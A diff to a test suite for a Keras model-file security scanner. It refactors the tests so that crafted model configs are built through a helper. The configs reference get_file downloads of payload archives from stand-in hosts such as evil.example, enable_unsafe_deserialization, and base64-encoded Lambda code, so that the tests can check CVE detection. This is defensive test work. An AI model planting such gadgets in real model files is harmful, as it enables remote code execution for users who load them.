@@ -6873,24 +6521,19 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_tar_url_in_kwargs_detects_cve_2025_12060(self, tmp_path: Path) -> None:
         """kwargs.origin plus kwargs.extract=True should be treated as a get_file extraction call."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "keras.utils.get_file",
-                            "kwargs": {
-                                "origin": "https://evil.example/payload.tgz",
-                                "extract": True,
-                            },
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "keras.utils.get_file",
+                    "kwargs": {
+                        "origin": "https://evil.example/payload.tgz",
+                        "extract": True,
+                    },
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -6900,23 +6543,18 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_tar_archive_format_detects_cve_2025_12060(self, tmp_path: Path) -> None:
         """Explicit tar archive_format should not rely on a tar-looking URL suffix."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/download?id=payload",
-                            "extract": True,
-                            "archive_format": "tar",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.example/download?id=payload",
+                    "extract": True,
+                    "archive_format": "tar",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -6927,22 +6565,17 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_named_untar_detects_cve_2025_12060_without_tar_suffix(self, tmp_path: Path) -> None:
         """Named untar=True should mark a remote get_file URL as tar extraction."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/download",
-                            "untar": True,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.example/download",
+                    "untar": True,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -6954,22 +6587,17 @@ class TestCVE20258747GetFileGadget:
         """URL fragments must not hide tar extraction gadgets from CVE attribution."""
         scanner = KerasZipScanner()
         archive_url = "https://user:pass@evil.example/payload.tar.gz?token=SECRET#comment-token"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": archive_url,
-                            "extract": True,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": archive_url,
+                    "extract": True,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -6986,24 +6614,19 @@ class TestCVE20258747GetFileGadget:
         """kwargs.origin fragments should remain part of the detected archive URL."""
         scanner = KerasZipScanner()
         archive_url = "https://evil.example/payload.tgz#fragment"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "keras.utils.get_file",
-                            "kwargs": {
-                                "origin": archive_url,
-                                "extract": True,
-                            },
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "keras.utils.get_file",
+                    "kwargs": {
+                        "origin": archive_url,
+                        "extract": True,
+                    },
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7015,21 +6638,16 @@ class TestCVE20258747GetFileGadget:
         """Positional extract=True uses the tar-capable default auto format."""
         scanner = KerasZipScanner()
         archive_url = "https://evil.example/download"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "keras.utils.get_file",
-                            "args": ["payload.tar.zst", archive_url, False, None, None, "datasets", "auto", True],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "keras.utils.get_file",
+                    "args": ["payload.tar.zst", archive_url, False, None, None, "datasets", "auto", True],
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7041,21 +6659,16 @@ class TestCVE20258747GetFileGadget:
         """Positional archive_format='tar' should not rely on a tar-looking URL suffix."""
         scanner = KerasZipScanner()
         archive_url = "https://evil.example/download?id=payload"
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "keras.utils.get_file",
-                            "args": ["payload", archive_url, False, None, None, "datasets", "auto", True, "tar"],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "keras.utils.get_file",
+                    "args": ["payload", archive_url, False, None, None, "datasets", "auto", True, "tar"],
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7066,22 +6679,17 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_tar_url_without_extract_true_no_cve_2025_12060(self, tmp_path: Path) -> None:
         """Tar URLs are only CVE-2025-12060 when the same get_file call extracts them."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/payload.tar.gz",
-                            "extract": False,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.example/payload.tar.gz",
+                    "extract": False,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7090,23 +6698,18 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_zip_archive_format_no_cve_2025_12060(self, tmp_path: Path) -> None:
         """Explicit zip format disables tar extraction even for a tar-looking URL."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/payload.tar.gz",
-                            "extract": True,
-                            "archive_format": "zip",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.example/payload.tar.gz",
+                    "extract": True,
+                    "archive_format": "zip",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7115,22 +6718,17 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_default_auto_detects_generic_url_cve_2025_12060(self, tmp_path: Path) -> None:
         """Default auto format content-sniffs tar archives regardless of URL suffix."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.example/payload.bin",
-                            "extract": True,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.example/payload.bin",
+                    "extract": True,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7140,23 +6738,18 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_explicit_auto_detects_generic_url_cve_2025_12060(self, tmp_path: Path) -> None:
         """Explicit auto format also enables tar content sniffing."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "origin": "https://evil.example/download",
-                            "extract": True,
-                            "archive_format": "auto",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "origin": "https://evil.example/download",
+                    "extract": True,
+                    "archive_format": "auto",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7166,46 +6759,36 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_extract_tar_in_format_list_detects_cve_2025_12060(self, tmp_path: Path) -> None:
         """A valid format list may try zip first and then tar."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "origin": "https://evil.example/download",
-                            "extract": True,
-                            "archive_format": ["zip", "tar"],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "origin": "https://evil.example/download",
+                    "extract": True,
+                    "archive_format": ["zip", "tar"],
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
 
     def _assert_get_file_format_without_cve(self, tmp_path: Path, archive_format: Any) -> None:
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "origin": "https://evil.example/payload.tar.gz",
-                            "extract": True,
-                            "archive_format": archive_format,
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "origin": "https://evil.example/payload.tar.gz",
+                    "extract": True,
+                    "archive_format": archive_format,
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7242,10 +6825,9 @@ class TestCVE20258747GetFileGadget:
             "origin": "https://evil.example/download",
             argument: value,
         }
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
-        }
+        config = _sequential_config(
+            {"class_name": "Dense", "name": "dense_1", "config": call_config},
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7288,10 +6870,9 @@ class TestCVE20258747GetFileGadget:
     ) -> None:
         """Truthy kwargs and positional values must match Keras extraction behavior."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
-        }
+        config = _sequential_config(
+            {"class_name": "Dense", "name": "dense_1", "config": call_config},
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7332,10 +6913,9 @@ class TestCVE20258747GetFileGadget:
     ) -> None:
         """False-like extraction values must not create archive-traversal false positives."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
-        }
+        config = _sequential_config(
+            {"class_name": "Dense", "name": "dense_1", "config": call_config},
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7344,26 +6924,21 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_url_valued_kwargs_metadata_is_not_origin(self, tmp_path: Path) -> None:
         """URL-looking kwargs outside origin/url must not be reported as the downloaded archive."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "kwargs": {
-                                "origin": "/local/model",
-                                "file_hash": "https://docs.example/not-the-origin",
-                                "extract": True,
-                                "archive_format": "tar",
-                            },
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "kwargs": {
+                        "origin": "/local/model",
+                        "file_hash": "https://docs.example/not-the-origin",
+                        "extract": True,
+                        "archive_format": "tar",
+                    },
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7371,31 +6946,26 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_url_valued_positional_fname_is_not_origin(self, tmp_path: Path) -> None:
         """Only positional index 1 is the remote get_file origin."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "args": [
-                                "https://docs.example/not-the-origin",
-                                "/local/model",
-                                False,
-                                None,
-                                None,
-                                "datasets",
-                                "auto",
-                                True,
-                                "tar",
-                            ],
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "args": [
+                        "https://docs.example/not-the-origin",
+                        "/local/model",
+                        False,
+                        None,
+                        None,
+                        "datasets",
+                        "auto",
+                        True,
+                        "tar",
+                    ],
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7403,24 +6973,19 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_metadata_extract_tar_url_no_cve_2025_12060(self, tmp_path: Path) -> None:
         """Metadata nested beside get_file should not be mistaken for get_file extraction args."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "metadata": {
-                                "origin": "https://evil.example/payload.tar.gz",
-                                "extract": True,
-                            },
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "metadata": {
+                        "origin": "https://evil.example/payload.tar.gz",
+                        "extract": True,
+                    },
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
@@ -7428,22 +6993,17 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_with_nested_metadata_url_not_flagged(self, tmp_path: Path) -> None:
         """Nested metadata URLs in the same node should not be treated as get_file arguments."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "metadata": {"homepage": "https://example.com/model-docs"},
-                            "path": "/local/file.h5",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "metadata": {"homepage": "https://example.com/model-docs"},
+                    "path": "/local/file.h5",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
@@ -7452,21 +7012,16 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
         """Embedded comment tokens in URL strings should not suppress detection."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {
-                            "fn": "get_file",
-                            "url": "https://evil.com/payload.bin#comment-token",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {
+                    "fn": "get_file",
+                    "url": "https://evil.com/payload.bin#comment-token",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) >= 1
@@ -7476,18 +7031,13 @@ class TestCVE20258747GetFileGadget:
     def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
         """Config with get_file but no URL should NOT trigger."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {"fn": "get_file", "path": "/local/file.h5"},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {"fn": "get_file", "path": "/local/file.h5"},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
@@ -7496,10 +7046,9 @@ class TestCVE20258747GetFileGadget:
     def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
         """Normal config should not trigger CVE-2025-8747."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "Dense", "name": "dense_1", "config": {"units": 10}},
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
@@ -7524,21 +7073,16 @@ class TestCVE20258747GetFileGadget:
         """CVE details should be in issue details."""
         scanner = KerasZipScanner()
         config_str = json.dumps(
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "Dense",
-                            "name": "d",
-                            "config": {
-                                "fn": "get_file",
-                                "url": "http://evil.com/x",
-                            },
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "Dense",
+                    "name": "d",
+                    "config": {
+                        "fn": "get_file",
+                        "url": "http://evil.com/x",
+                    },
                 },
-            }
+            )
         )
         result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
 
@@ -7975,18 +7519,13 @@ class TestKerasZipConfigTraversalBudget:
             item_iterations = 0
 
         inbound_nodes = CountingList({"args": [], "kwargs": {}} for _ in range(100))
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "config": {},
-                        "inbound_nodes": inbound_nodes,
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "config": {},
+                "inbound_nodes": inbound_nodes,
             },
-        }
+        )
         scanner = KerasZipScanner({"max_config_traversal_items": 9})
         scanner.current_file_path = "bounded.keras"
         result = ScanResult(scanner_name=scanner.name, scanner=scanner)
@@ -8025,17 +7564,12 @@ class TestKerasZipConfigTraversalBudget:
         assert "keras_zip_config_traversal_depth_exceeded" in result.metadata["scan_outcome_reasons"]
 
     def test_bounded_projection_preserves_boundary_lambda_finding(self) -> None:
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "config": {},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "config": {},
             },
-        }
+        )
         scanner = KerasZipScanner({"max_config_traversal_depth": 3})
         scanner.current_file_path = "bounded.keras"
         result = ScanResult(scanner_name=scanner.name, scanner=scanner)
@@ -8455,21 +7989,16 @@ class TestCVE20259906UnsafeDeserialization:
     def test_enable_unsafe_deserialization_detected(self, tmp_path: Path) -> None:
         """Config referencing enable_unsafe_deserialization should be CRITICAL."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "module": "keras.config",
-                        "config": {
-                            "fn": "enable_unsafe_deserialization",
-                        },
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "module": "keras.config",
+                "config": {
+                    "fn": "enable_unsafe_deserialization",
+                },
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
@@ -8503,18 +8032,13 @@ class TestCVE20259906UnsafeDeserialization:
     def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
         """Normal config without enable_unsafe_deserialization should be clean."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "dense_1",
-                        "config": {"units": 10},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "dense_1",
+                "config": {"units": 10},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
@@ -8524,19 +8048,14 @@ class TestCVE20259906UnsafeDeserialization:
         """CVE details should be present in issue details."""
         scanner = KerasZipScanner()
         config_str = json.dumps(
-            {
-                "class_name": "Sequential",
-                "config": {
-                    "layers": [
-                        {
-                            "class_name": "Dense",
-                            "name": "d",
-                            "module": "keras.config",
-                            "config": {"fn": "enable_unsafe_deserialization"},
-                        }
-                    ]
+            _sequential_config(
+                {
+                    "class_name": "Dense",
+                    "name": "d",
+                    "module": "keras.config",
+                    "config": {"fn": "enable_unsafe_deserialization"},
                 },
-            }
+            )
         )
         result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
 
@@ -8589,19 +8108,14 @@ class TestCVE20259906UnsafeDeserialization:
     def test_comment_token_does_not_suppress_malicious_detection(self, tmp_path: Path) -> None:
         """Embedding a single comment token should not suppress CVE detection."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Dense",
-                        "name": "d",
-                        "module": "keras.config",
-                        "config": {"fn": "enable_unsafe_deserialization", "notes": "#"},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Dense",
+                "name": "d",
+                "module": "keras.config",
+                "config": {"fn": "enable_unsafe_deserialization", "notes": "#"},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
         assert len(cve_issues) >= 1
@@ -8734,18 +8248,13 @@ class TestCVE20243660LambdaAttribution:
         """Lambda layer in .keras file should include CVE-2024-3660 attribution."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "my_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "my_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
@@ -8762,18 +8271,13 @@ class TestCVE20243660LambdaAttribution:
         """Display redaction must not downgrade a valid vulnerable local version."""
         raw_secret = "sk-proj-CAND061ZIPVERSIONSECRET000000000000"
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "redacted_version_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "redacted_version_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
 
         result = KerasZipScanner().scan(self._make_keras_zip(config, tmp_path, keras_version=f"2.12.0+{raw_secret}"))
         cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2024-3660"]
@@ -8794,18 +8298,13 @@ class TestCVE20243660LambdaAttribution:
         """Keras-qualified Lambda class names should use Lambda-specific ZIP checks."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"exec('print(1)')").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": layer_class,
-                        "name": "qualified_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": layer_class,
+                "name": "qualified_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
@@ -8819,18 +8318,13 @@ class TestCVE20243660LambdaAttribution:
         """Custom classes ending in Lambda should not be treated as Keras Lambda."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"exec('print(1)')").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "myproject.layers.Lambda",
-                        "name": "custom_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "myproject.layers.Lambda",
+                "name": "custom_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
@@ -8848,10 +8342,9 @@ class TestCVE20243660LambdaAttribution:
     def test_no_cve_without_lambda(self, tmp_path: Path) -> None:
         """Non-Lambda model should NOT have CVE-2024-3660 attribution."""
         scanner = KerasZipScanner()
-        config = {
-            "class_name": "Sequential",
-            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
-        }
+        config = _sequential_config(
+            {"class_name": "Dense", "name": "dense_1", "config": {"units": 10}},
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path))
 
         cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
@@ -8861,18 +8354,13 @@ class TestCVE20243660LambdaAttribution:
         """Lambda in fixed Keras version should not be CVE-attributed."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "my_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "my_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         keras_path = tmp_path / "model_fixed.keras"
         with zipfile.ZipFile(keras_path, "w") as zf:
             zf.writestr("config.json", json.dumps(config))
@@ -8901,18 +8389,13 @@ class TestCVE20243660LambdaAttribution:
         """Prereleases of the CVE-2024-3660 fixed Keras version should remain vulnerable."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "my_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "my_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         keras_path = self._make_keras_zip(config, tmp_path, keras_version=keras_version)
 
         result = scanner.scan(keras_path)
@@ -8948,18 +8431,13 @@ class TestCVE20243660LambdaAttribution:
